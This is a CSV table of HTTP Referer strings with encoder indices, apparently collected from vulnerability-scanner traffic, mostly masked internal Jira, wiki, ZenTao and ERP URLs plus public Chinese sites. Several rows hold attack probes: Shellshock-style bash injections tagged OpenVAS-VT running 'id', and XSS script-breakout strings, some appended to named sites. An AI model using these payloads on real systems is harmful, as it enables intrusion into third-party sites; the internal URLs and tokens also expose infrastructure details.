httpReferer,encoder,mode_is
"'""()&%<acx><ScRiPt >V6sf(9994)</ScRiPt>",0,0
() { OpenVAS-VT:; }; echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id;,1,0
() { _; OpenVAS-VT; } >_[$($())] { echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id; },2,0
"*/-->'""></iframe></script></style></title></textarea><script >alert(15378)</script>",3,0
"*/-->'""></iframe></script></style></title></textarea><script >alert(62920)</script>",4,0
"*/-->'""></iframe></script></style></title></textarea><script >alert(78168)</script>",5,0
Nan,6,1
bGlua2Fub3Ztb3dtcnVzNA==,7,0
http://*..163.com/jiankang/article_cambrian/F53JFOB1053469KO.html,8,0
http://*.139.73.*:8080/Web_sc/login.gn,9,0
http://*.150.39.*/,10,0
http://*.150.39.*/content/layui/css/layui.css,11,0
http://*.150.39.*/login,12,0
http://*.153.4.*/?<script>cross_site_scripting.nasl</script>,13,0
http://*.16.20.*/env/1a48987/apps/add-balancer?serviceId=1s2136&stackId=1st597&upgrade=true,14,0
http://*.168.19.*/index.html,15,0
http://*.168.19.*/static/css/app.03ca5a15b4adbb2519200bedaef35d84.css,16,0
http://*.168.21.*/zentao/bug-resolve-1528.html?onlybody=yes,17,0
http://*.168.3.*/U9/erp/display.aspx?lnk=CBO.Pub.Customer.CustomerList&sId=3000nid&bId=1001101159162177&ShowType=NavigatePage&ParentForm=c60a3c61-932c-45f9-9745-162e0807d1c9&__fsk=__SK93959*__SK93959&__curOId=1001712070000049&ID=1001801150123558,18,0
http://*.168.3.*/U9/erp/display.aspx?lnk=CBO.Pub.Item.ItemList&sId=3000nid&bId=1001101159162183&ShowType=NavigatePage&ParentForm=053a1be3-2c56-428b-b221-b5291644f2cb&__fsk=__SK62762*__SK62762&__curOId=1001712070000049,19,0
http://*.168.3.*/U9/erp/display.aspx?lnk=SCM.SD.SDA010_20&sId=3015nid&bId=1001101160311911&ShowType=NavigatePage&ParentForm=7dde4c9d-98a2-4bb1-bc42-bccd74e4e1ac&__fsk=__SK73144*__SK73144&__curOId=1001712070000049,20,0
http://*.168.3.*/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=&chromeType=4&ShowType=ModalRef&SOB=1001712080002065&SOBVersion=-1&IsForReport=1&FilterRefTag=Report&__sk=__SK7514&__curOId=1001712070000049&layerId=10endLayerId,21,0
http://*.168.3.*/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=d56ab174-95c7-4462-8e59-6c318c0d626d&chromeType=4&ShowType=ModalRef&SOB=1001712080002065&SOBVersion=-1&IsForReport=1&FilterRefTag=Report&IsMultiRefTag=True&__sk=__SK83655&__curOId=1001712070000049&layerId=7endLayerId,22,0
http://*.168.3.*/pages/viewpage.action?pageId=42500099,23,0
http://*.168.3.*/qm/bug/bugAction.do?action=doBugBf&fromDetail=false&functionID=&id=42932&popup=true&nextUrl=%2Fqm%2Fbug%2FbugAction.do%3Faction%3DgetBugDetail%26id%3D42932%26popup%3Dtrue,24,0
http://*.168.3.*/qm/bug/bugAction.do?action=doBugBf&fromDetail=false&functionID=Bug&id=36354,25,0
http://*.168.3.*/qm/bug/bugAction.do?action=doBugBf&fromDetail=false&functionID=Bug&id=39807,26,0
http://*.168.3.*/qm/bug/bugAction.do?action=doBugBf&fromDetail=false&functionID=PersonalBug_assignee&id=43010,27,0
http://*.168.31.*/depot/ticket/index/ticketIdentification/FEGSY-XZ6KA-VRTEQ-W76JR-WSWF6,28,0
http://*.168.31.*/depot/ticket/index/ticketIdentification/U2CNK-CF5P6-TVHDW-84PFT-UL35H,29,0
http://*.168.31.*/zentao/bug-create-6-0-moduleID=354.html,30,0
http://*.168.31.*/zentao/bug-resolve-1199.html?onlybody=yes,31,0
http://*.168.34.*/expert/,32,0
http://*.168.34.*/screen/,33,0
http://*.168.38.*:8081/,34,0
http://*.178.79.*:30018/map/Apps/Sandcastle/dianzishapan/dianzishapan.html,35,0
http://*.20.120.*:18120/,36,0
http://*.20.120.*:18120/login,37,0
http://*.20.128.*/emer/,38,0
http://*.20.128.*/screen/,39,0
http://*.20.140.*/zentao/index.php?m=bug&f=resolve&bugID=2725&onlybody=yes,40,0
http://*.20.140.*/zentao/index.php?m=bug&f=resolve&bugID=2727&onlybody=yes,41,0
http://*.20.140.*/zentao/index.php?m=bug&f=resolve&bugID=2728&onlybody=yes,42,0
http://*.20.140.*/zentao/index.php?m=bug&f=resolve&bugID=2733&onlybody=yes,43,0
http://*.20.152.*/xiaojunjie/redteam-exploits/tree/master/exploits/networks/security,44,0
http://*.20.152.*/xiaojunjie/redteam-exploits/tree/master/exploits/networks/security/officescan,45,0
http://*.20.152.*/xiaojunjie/redteam-exploits/tree/master/exploits/networks/web/mail2k,46,0
http://*.20.28.*/,47,0
http://*.20.28.*/images/apache_pb.gif,48,0
http://*.20.28.*/login/,49,0
http://*.20.28.*/noindex/css/bootstrap.min.css,50,0
http://*.20.28.*/screen/,51,0
http://*.20.3.*:8080/xkefu/jabber.jsp,52,0
http://*.20.86.*:1002/knowledge/publish,53,0
http://*.236.191.*:7080/zsdypt/certificate.jsp?1=1&ticket=ff808081707ce50401707f1ea2bd6903-ticket,54,0
http://*.50.2.*/jira/browse/BDSAP-181,55,0
http://*.50.2.*/jira/browse/CUS-41,56,0
http://*.50.2.*/jira/browse/CUS-43,57,0
http://*.50.2.*/jira/issues/?filter=-2,58,0
http://*.50.2.*/jira/issues/?filter=-7,59,0
http://*.50.2.*/jira/issues/?filter=10309,60,0
http://*.50.2.*/jira/projects/AVDEV?selectedItem=com.atlassian.jira.jira-projects-plugin:report-page,61,0
http://*.50.2.*/jira/projects/BAAS/issues/BAAS-18?filter=myopenissues,62,0
http://*.50.2.*/jira/projects/CUS/issues/CUS-17?filter=allopenissues,63,0
http://*.50.2.*/jira/projects/CUS/versions/10502,64,0
http://*.50.2.*/jira/projects/CUS?selectedItem=com.atlassian.jira.jira-projects-plugin:release-page,65,0
http://*.50.2.*/jira/projects/IMP/issues,66,0
http://*.50.2.*/jira/projects/IMP/issues/IMP-287?filter=allopenissues,67,0
http://*.50.2.*/jira/secure/Dashboard.jspa,68,0
http://*.50.2.*/jira/secure/Dashboard.jspa?selectPageId=10300,69,0
http://*.50.2.*/wiki/,70,0
http://*.50.2.*/wiki/display/AIL,71,0
http://*.50.2.*/wiki/display/BDSAP/2020.01.09+v3.5+M2,72,0
http://*.50.2.*/wiki/display/BDSAP/2020.01.09+v3.5+M2?src=contextnavpagetreemode,73,0
http://*.50.2.*/wiki/display/BaaS,74,0
http://*.50.2.*/wiki/display/BaaS/2020.02.*,75,0
http://*.50.2.*/wiki/pages/diffpagesbyversion.action?pageId=12746803&selectedPageVersions=38&selectedPageVersions=37,76,0
http://*.50.2.*/wiki/pages/resumedraft.action?draftId=12156958&draftShareId=2ffa1dcc-8b50-40e1-886c-9ecc569d8584,77,0
http://*.50.2.*/wiki/pages/resumedraft.action?draftId=12746780&draftShareId=91dce2d3-a090-4809-b76e-405385116ef9,78,0
http://*.50.2.*/wiki/pages/resumedraft.action?draftId=12746852&draftShareId=087ba6d5-acb7-47b2-8aaf-8b2bb6211227,79,0
http://*.50.2.*/wiki/pages/resumedraft.action?draftId=12747305&draftShareId=840253b9-d234-487e-92e8-cd3ef3871624,80,0
http://*.50.2.*/wiki/pages/resumedraft.action?draftId=12749764&draftShareId=644ea09f-f8b8-49ea-a825-ead49cb88b20,81,0
http://*.50.2.*/wiki/pages/resumedraft.action?draftId=12750493&draftShareId=0c419d2e-75c9-4671-b504-fad846785cc0,82,0
http://*.50.2.*/wiki/pages/resumedraft.action?draftId=12750582&draftShareId=6bb5629a-7ab5-4fd4-af29-f081053e10e8,83,0
http://*.50.2.*/wiki/pages/resumedraft.action?draftId=12750650&draftShareId=2ce81514-a7d0-44ec-a9d3-2244644ba9b0,84,0
http://*.50.2.*/wiki/pages/resumedraft.action?draftId=12750736&draftShareId=394c0494-50e0-481e-ac75-ccc42b7f480d,85,0
http://*.50.2.*/wiki/pages/resumedraft.action?draftId=12750758&draftShareId=a6ff9123-c486-4c89-9662-d29ee06b58c8,86,0
http://*.50.2.*/wiki/pages/resumedraft.action?draftId=12750819&draftShareId=58022050-52aa-4b6b-a26a-23ac7523b161,87,0
http://*.50.2.*/wiki/pages/resumedraft.action?draftId=12750820&draftShareId=58022050-52aa-4b6b-a26a-23ac7523b161,88,0
http://*.50.2.*/wiki/pages/resumedraft.action?draftId=12750873&draftShareId=684aa02e-b964-4fdb-82c9-2e9652b51b6d,89,0
http://*.50.2.*/wiki/pages/resumedraft.action?draftId=12751004&draftShareId=99e3e91f-3943-4fac-97c3-7ccc1262a46e,90,0
http://*.50.2.*/wiki/pages/resumedraft.action?draftId=8716719&draftShareId=df8e56ee-1e3f-4404-ba29-2cd21afb5371,91,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12156955,92,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12746779,93,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12746796,94,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12746803,95,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12746803&focusedCommentId=12750753,96,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12746834,97,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12746837,98,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12746839,99,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12747023,100,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12747072,101,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12747100,102,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12747295,103,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12747295&src=sidebar,104,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12747297,105,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12747300,106,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12747327,107,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12747329,108,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12747380,109,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12747382,110,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12747445,111,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12747979,112,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12748133,113,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12748523,114,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12749312,115,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12749624,116,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12749762,117,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12749904,118,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12750305,119,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12750492,120,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12750640,121,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12750649,122,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12750694,123,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12750735,124,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12750739,125,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12750757,126,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12750819,127,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12750985,128,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=12751004,129,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=8716555,130,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=8716555&src=sidebar,131,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=8716555&src=spacemenu,132,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=8716974,133,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=8716976,134,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=8716976&src=contextnavchildmode,135,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=8717115,136,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=8717249,137,0
http://*.50.2.*/wiki/pages/viewpage.action?pageId=8717290,138,0
http://*.50.2.*/wiki/pages/worddav/uploadimport.action?pageId=12750492,139,0
http://*.50.2.*/wiki/plugins/inlinetasks/mytasks.action,140,0
http://*.50.2.*/wiki/plugins/servlet/gadgets/ifr?container=atlassian&mid=566953181184&country=CN&lang=zh&view=default&view-params=%7B%22writable%22%3A%22false%22%7D&st=atlassian%3AMuAE8Xjcn6Azj0infM762%2BWAHEW1%2FLx0cnLrszA3NMRj3J3c1NpMxCgZld68PTNckFq1HfHb81GM6knnD%2BMXJ5zM8JTCbAFJ3%2B3L%2B%2FkmClsVj1lSzwNUVU0TsXbi2tvktNX1cmYkQfHVin01qtrxRIhmE8Pq2NZcTPN391hkdm6rx2s1uxb0RE4DKNVaSi1650mf%2BoR26j%2F2mxawQJKjpGyjoi1ZJHMDlVEv7PkIsAmm0FP8pKmqTXRgl28pNcfJVPQ36BVUG6N37cEetllAR6LvxvCdnHU101hIXIZ0k7U0nmhbnxpVwssj3CHDh1y7SI9DxXqMZRm77bh0P2IvX8T6BZ%2Be416wuaAGvZ5kpr8vU4dc&up_isConfigured=true&up_isReallyConfigured=false&up_title=%E6%B4%BB%E5%8A%A8%E6%97%A5%E5%BF%97&up_titleRequired=true&up_numofentries=10&up_refresh=false&up_maxProviderLabelCharacters=50&up_rules=&up_renderingContext=&up_keys=&up_itemKeys=&up_username=&url=http%3A%2F%2F10.50.2.81%2Fwiki%2Frest%2Fgadgets%2F1.0%2Fg%2Fcom.atlassian.streams.confluence%3Aactivitystream-gadget%2Fgadgets%2Fconf-activitystream-gadget.xml&libs=auth-refresh,141,0
http://*.50.2.*/wiki/plugins/servlet/gadgets/ifr?container=atlassian&mid=566953181184&country=CN&lang=zh&view=default&view-params=%7B%22writable%22%3A%22false%22%7D&st=atlassian%3AVPNmlfR%2FjE3IFWU2zO%2F7KBlijB372KxJ9JhtoSNVe2%2BkXA59vJXaet46GxoeJCvbbiio9h3o1YpF5BDnmbahtx5hR7gZEndUTHCE47AdfdHWMNVWw4eAABN9bQoNspbXfeSltkCCbWp7K%2BA7hZf%2Ftg36oDXEylagN9NufPSAjAHZ%2FCIUCA3TAogjmGVaNpVntrXkkLElegQ6NC5qDF3wyhcRFCg0KRWs0kN9UUWgULmkm%2BQxcEBUDZwq6PtD3TT%2BOzs9%2FwezWNQa%2B5HaVAQp1IgP32j9HAchbGdLCb3T77Z6Njbz1npbzdnZlYUzBPHdYLZs33pEbhC6cNo9IqzlHlBFdMlceIuIi6C%2Bm2WPIFAZCtfQ&up_isConfigured=true&up_isReallyConfigured=false&up_title=%E6%B4%BB%E5%8A%A8%E6%97%A5%E5%BF%97&up_titleRequired=true&up_numofentries=10&up_refresh=false&up_maxProviderLabelCharacters=50&up_rules=&up_renderingContext=&up_keys=&up_itemKeys=&up_username=&url=http%3A%2F%2F10.50.2.81%2Fwiki%2Frest%2Fgadgets%2F1.0%2Fg%2Fcom.atlassian.streams.confluence%3Aactivitystream-gadget%2Fgadgets%2Fconf-activitystream-gadget.xml&libs=auth-refresh,142,0
http://*.50.2.*/wiki/plugins/servlet/gadgets/ifr?container=atlassian&mid=566953181184&country=CN&lang=zh&view=default&view-params=%7B%22writable%22%3A%22false%22%7D&st=atlassian%3AaRDxjCwy4VP5XqksJKvkhbhp8JOQqVAN3sbFVY0QU26YgtPBk8rhSMMkoV%2BrAzlthqkMXs6%2BpcMJSKix5LHtyO%2FF7M%2B4x8rMN%2FOyFC4YOtKIa%2FirCkafvgmxPLt0B1xzVs3WUXWyCP%2Fu461%2FeR4uHkkWHboa6hCp%2FlJdzIW%2FTs0tDZYDrzeM6WjSgceqNYvhDDQcGJghL255vv47dWQNe06XyqqJCJ7sJ%2F1xvz%2BtLUDcdvHjPZ2fd8Dz0DiFR4iBoWeM5GKYVfHeOWiJauAqE7wQoSLFRmKpFrL1i48vNOaNbmzYhRH%2BUlMO5h2GIt3r3sqxV6yZIjzl82BAp6z849zqFzmvLcgx0VZvJkv%2B3t6FVhKz&up_isConfigured=true&up_isReallyConfigured=false&up_title=%E6%B4%BB%E5%8A%A8%E6%97%A5%E5%BF%97&up_titleRequired=true&up_numofentries=10&up_refresh=false&up_maxProviderLabelCharacters=50&up_rules=&up_renderingContext=&up_keys=&up_itemKeys=&up_username=&url=http%3A%2F%2F10.50.2.81%2Fwiki%2Frest%2Fgadgets%2F1.0%2Fg%2Fcom.atlassian.streams.confluence%3Aactivitystream-gadget%2Fgadgets%2Fconf-activitystream-gadget.xml&libs=auth-refresh,143,0
http://*.50.23.*:13001/audit,144,0
http://*.99.186.*:8082/mall/goods/add,145,0
http://*.daohang88.com/,146,0
http://*.ielan.com/,147,0
http://*.sogou.com/tools/wnl.html,148,0
http://*.sogou.com/zhuanti/browserfeed.html?V=15,149,0
http://ad.winrar.com.cn/show_2.html?L=7&bl=7&v=550personal&a=64&src=pe006,150,0
http://ad.winrar.com.cn/show_2.html?L=7&bl=7&v=570personal&a=64&src=pe001,151,0
http://admin.antivirus-ncov.dev.wochanye.com/,152,0
http://app.gjzwfw.gov.cn/jmopen/webapp/html5/unZip/f441935cd33b4651b3ee0558bf596904/jygjgcsrymdxxcxpc/index.html?webId=1,153,0
http://astrowww.bnu.edu.cn/NewCN/case.php?cid=42,154,0
http://b2c.tibetairlines.com.cn/,155,0
http://bbs.itheima.com/forum.php?mod=viewthread&tid=450328,156,0
http://bbs.itheima.com/thread-133454-1-1.html,157,0
http://bbs.sdbeta.com/read-htm-tid-569423.html,158,0
http://bioon.com.cn/campaign/?keyword=%E6%AD%A6%E6%B1%89%22%20onclick%3D%22alert(58535),159,0
http://blog.sina.cn/dpool/blog/s/blog_157c8c6ed0102w22q.html,160,0
http://burp/,161,0
http://ciccsv.bnu.edu.cn/index.php?m=member&c=index&a=login');alert(02163)//,162,0
http://cloudfile.das-security.cn/files/,163,0
http://cloudfile.das-security.cn/files/%E5%85%AC%E5%8F%B8%E4%BA%A7%E5%93%81/,164,0
http://cn.bing.com/?scope=web&FORM=QBLH,165,0
http://console.apistore.cn/Login/reg/registerType/email?callback=1%27%22()%26%25%3Cacx%3E%3Cscript%20%3Ealert(9324)%3C/script%3E,166,0
http://const.tms.beisen.com/default.aspx,167,0
http://csh5rs.52jiami.com/mj/web-qtt/?channel=503&app_id=a3F1bTkGXGEd&app_name=%E6%AC%A2%E4%B9%90%E9%BA%BB%E5%B0%863D%E7%89%88&appid=a3F1bTkGXGEd&dc=868097043619920&dtu=014&ext=eyJzb3VyY2UiOiIyODYxNjYifQ%3D%3D&origin_type=0&platform=qtt&sdk_version=cocos.e87d2981c0cac29315df.js&sign=1718709759a5b414735ef97e360b92da&source=286166&tag_id=&ticket=t11XhCiLgjhLa2khhqBFm&time=1582695783&uuid=953961572&v=30965000&vn=3.9.65.000.0219.1545&lat=0.0&lon=0.*,168,0
http://csr.adl.io/manage/securityBase/274/edit,169,0
http://cxpt.hzwindow.com.cn/,170,0
http://cxpt.hzwindow.com.cn/hdip,171,0
http://cxpt.hzwindow.com.cn/hdip/,172,0
http://cxpt.hzwindow.com.cn/hdip/#/login,173,0
"http://cxpt.hzwindow.com.cn/hdip/#/login*/-->'""></iframe></script></style></title></textarea><script >alert(02370)</script>",174,0
"http://cxpt.hzwindow.com.cn/hdip/#/login*/-->'""></iframe></script></style></title></textarea><script >alert(24750)</script>",175,0
"http://cxpt.hzwindow.com.cn/hdip/#/login*/-->'""></iframe></script></style></title></textarea><script >alert(62161)</script>",176,0
http://cxpt.hzwindow.com.cn/hdip/#/login?from=pc,177,0
"http://cxpt.hzwindow.com.cn/hdip/#/login?from=pc*/-->'""></iframe></script></style></title></textarea><script >alert(35457)</script>",178,0
"http://cxpt.hzwindow.com.cn/hdip/*/-->'""></iframe></script></style></title></textarea><script >alert(55890)</script>",179,0
"http://cxpt.hzwindow.com.cn/hdip/*/-->'""></iframe></script></style></title></textarea><script >alert(95393)</script>",180,0
http://cxpt.hzwindow.com.cn/hdip//award/award_list.action,181,0
http://cxpt.hzwindow.com.cn/hdip//login/login_history.action,182,0
http://cxpt.hzwindow.com.cn/hdip/announce/announce_list.action,183,0
http://cxpt.hzwindow.com.cn/hdip/expert/expert_list.action,184,0
http://cxpt.hzwindow.com.cn/hdip/login/login_history.action,185,0
http://cxpt.hzwindow.com.cn/hdip/program/program_audit.action,186,0
http://cxpt.hzwindow.com.cn/hdip/program/program_list.action,187,0
http://cxpt.hzwindow.com.cn/hdip/role/role_list.action,188,0
http://cxpt.hzwindow.com.cn/hdip/static/css/app.4d0d1e76ec2e290e2dc385a77e4e97cb.css,189,0
"http://cxpt.hzwindow.com.cn/hdip/static/css/app.4d0d1e76ec2e290e2dc385a77e4e97cb.css'""[]()",190,0
http://cxpt.hzwindow.com.cn/hdip/static/css/app.4d0d1e76ec2e290e2dc385a77e4e97cb.css-99999999999999999999,191,0
http://cxpt.hzwindow.com.cn/hdip/static/css/app.4d0d1e76ec2e290e2dc385a77e4e97cb.css99999999999999999999,192,0
"http://cxpt.hzwindow.com.cn/hdip/static/css/data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAIAAADZF8uwAAAAGUlEQVQYV2M4gwH+YwCGIasIUwhT25BVBADtzYNYrHvv4gAAAABJRU5ErkJggg==",193,0
"http://cxpt.hzwindow.com.cn/hdip/static/css/data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAIAAADZF8uwAAAAGUlEQVQYV2M4gwH+YwCGIasIUwhT25BVBADtzYNYrHvv4gAAAABJRU5ErkJggg==""",194,0
"http://cxpt.hzwindow.com.cn/hdip/static/css/data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAIAAADZF8uwAAAAGUlEQVQYV2M4gwH+YwCGIasIUwhT25BVBADtzYNYrHvv4gAAAABJRU5ErkJggg==%00",195,0
"http://cxpt.hzwindow.com.cn/hdip/static/css/data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAIAAADZF8uwAAAAGUlEQVQYV2M4gwH+YwCGIasIUwhT25BVBADtzYNYrHvv4gAAAABJRU5ErkJggg==%27",196,0
"http://cxpt.hzwindow.com.cn/hdip/static/css/data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAIAAADZF8uwAAAAGUlEQVQYV2M4gwH+YwCGIasIUwhT25BVBADtzYNYrHvv4gAAAABJRU5ErkJggg=='""[]()",197,0
"http://cxpt.hzwindow.com.cn/hdip/static/css/data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAIAAADZF8uwAAAAGUlEQVQYV2M4gwH+YwCGIasIUwhT25BVBADtzYNYrHvv4gAAAABJRU5ErkJggg==-99999999999999999999",198,0
"http://cxpt.hzwindow.com.cn/hdip/static/css/data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAIAAADZF8uwAAAAGUlEQVQYV2M4gwH+YwCGIasIUwhT25BVBADtzYNYrHvv4gAAAABJRU5ErkJggg==YYYYYYYYYYYYYYYYYYYY",199,0
http://cxpt.hzwindow.com.cn/hdip/static/img/app_qr_pc.0b31bf1.jpg,200,0
http://cxpt.hzwindow.com.cn/hdip/static/js/manifest.3ad1d5771e9b13dbdad2.js,201,0
http://cxpt.hzwindow.com.cn/hdip/user/user_list.action,202,0
http://cxpt.hzwindow.com.cn/static/css/app.4d0d1e76ec2e290e2dc385a77e4e97cb.css,203,0
http://data.eastmoney.com/dzjy/default.html,204,0
http://data.eastmoney.com/dzjy/dzjy_mrmxa.aspx?TimeSpanType=-1&startDate=2020-02-24&endDate=2020-02-24,205,0
http://data.eastmoney.com/gdfx/shareholder/d5c0fe300fe8e13ce74af859ba153333.html,206,0
http://data.eastmoney.com/hsgt/index.html,207,0
http://data.eastmoney.com/zjlx/,208,0
http://dcd-group.cn/%E6%B5%B7%E5%85%89%E5%BC%80%E5%A7%8B%E5%90%AF%E5%8A%A8%E7%94%9F%E4%BA%A7%E5%9F%BA%E4%BA%8Ezen%E6%9E%B6%E6%9E%84%E7%9A%84%E5%A4%84%E7%90%86%E5%99%A8/,209,0
http://demo.zentao.net/tutorial-wizard-story-create-cHJvZHVjdElEPTEmYnJhbmNoPTAmbW9kdWxlSUQ9MA==.html,210,0
http://desk.zol.com.cn/bizhi/8661_106831_2.html,211,0
http://desk.zol.com.cn/bizhi/8661_106832_2.html,212,0
http://desk.zol.com.cn/bizhi/8661_106833_2.html,213,0
http://e.vhall.com/,214,0
http://e.vhall.com/auth/register,215,0
http://edu.avtechcn.com/my/course/421,216,0
http://ent.163.com/,217,0
http://ent.sina.com.cn/m/f/2020-02-24/doc-iimxxstf3858104.shtml,218,0
http://ent.sina.com.cn/v/m/2020-02-11/doc-iimxyqvz1924762.shtml,219,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=CBO.Pub.DepartmentList&sId=3000nid&bId=1001101159162124&ShowType=NavigatePage&ParentForm=beee4a9d-0556-4787-a7f9-38d775f0c4f6&__fsk=__SK55857*__SK55857&__curOId=1001712070000049,220,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=CBO.Pub.DepartmentList&sId=3000nid&bId=1001101159162124&ShowType=NavigatePage&ParentForm=beee4a9d-0556-4787-a7f9-38d775f0c4f6&__fsk=__SK6047*__SK6047&__curOId=1001801170006914,221,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=CBO.Pub.Item.ItemList&sId=3000nid&bId=1001101159162183&ShowType=NavigatePage&ParentForm=053a1be3-2c56-428b-b221-b5291644f2cb&__fsk=__SK13304*__SK13304&__curOId=1001712070000049,222,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=CBO.Pub.Item.ItemList&sId=3000nid&bId=1001101160311154&ShowType=NavigatePage&ParentForm=053a1be3-2c56-428b-b221-b5291644f2cb&__fsk=__SK37905*__SK37905&__curOId=1001712070000049,223,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=CBO.Pub.OperatorList&sId=3000nid&bId=1001101159162125&ShowType=NavigatePage&ParentForm=28c124ba-9e0d-4248-a4c7-58b9e3fe0ea0&__fsk=__SK30713*__SK30713&__curOId=1001801170014659,224,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=CBO.Pub.PredeterminedAccountFactor.PredeterminedAccountFactorList&sId=3000nid&bId=1001101159162216&ShowType=NavigatePage&ParentForm=336259f4-54c3-4743-b66c-d4ec533022f0&__fsk=__SK75091*__SK75091&__curOId=1001712070000049,225,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=EAM.FA.AssetCard.FA_AssetCardBListUIForm&sId=3009nid&bId=1001101160305886&ShowType=NavigatePage&ParentForm=c96f1b8a-a16a-4f73-9e55-0e27909bc823&__fsk=__SK24430*__SK24430&__curOId=1001712070000049&ID=1001812180015837,226,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=EAM.FA.AssetCard.FA_AssetCardBListUIForm&sId=3009nid&bId=1001101160305886&ShowType=NavigatePage&ParentForm=c96f1b8a-a16a-4f73-9e55-0e27909bc823&__fsk=__SK80397*__SK80397&__curOId=1001712070000049,227,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=FI.GL.Account.NaturalAccountListUI&sId=3000nid&mId=1001101159162149&__curOId=1001712070000049,228,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=FI.GL.Account.SOBNaturalAccountListUI&sId=3000nid&bId=1001101159162149&ShowType=NavigatePage&ParentForm=47a75dd9-aaa6-4f39-a17c-b71c1c3559b4&__fsk=__SK20620*__SK20620&__curOId=1001712070000049,229,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=FI.GL.Process.Voucher.VoucherAuditList&VoucherCategory=VoucherApprove&sId=3002nid&mId=1001101160306475&__curOId=1001812050036831,230,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=FI.GL.Process.Voucher.VoucherReverseList&sId=3002nid&bId=1001101160306474&ShowType=NavigatePage&VoucherCategory=VoucherReverse&ParentForm=9407687f-3186-4f56-a7f6-c3af5dd733f7&__fsk=__SK13969*__SK13969&__curOId=1001712070000521,231,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=SCM.INV.INV2020_20&sId=3017nid&bId=1001101160308100&ShowType=NavigatePage&ParentForm=e3df0726-8f25-49f4-a28e-9ce1cba03835&__fsk=__SK19518*__SK19518&__curOId=1001712070000049,232,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=SCM.INV.INV2020_20&sId=3017nid&bId=1001101160308100&ShowType=NavigatePage&ParentForm=e3df0726-8f25-49f4-a28e-9ce1cba03835&__fsk=__SK29186*__SK29186&__curOId=1001712070000049,233,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=SCM.PM.PM3020_20&sId=3016nid&bId=1001101160311113&ShowType=NavigatePage&PR_Type=PM3020&ParentForm=4e0a5ff2-3fcd-4403-8d36-068f37667c4f&__fsk=__SK47288*__SK47288&__curOId=1001712070000049&ID=1001910250008813,234,0
http://erp.*.com.cn/U9/erp/display.aspx?lnk=SCM.SD.SDA010_20&sId=3015nid&bId=1001101160311911&ShowType=NavigatePage&ParentForm=7dde4c9d-98a2-4bb1-bc42-bccd74e4e1ac&__fsk=__SK86413*__SK86413&__curOId=1001712070000049,235,0
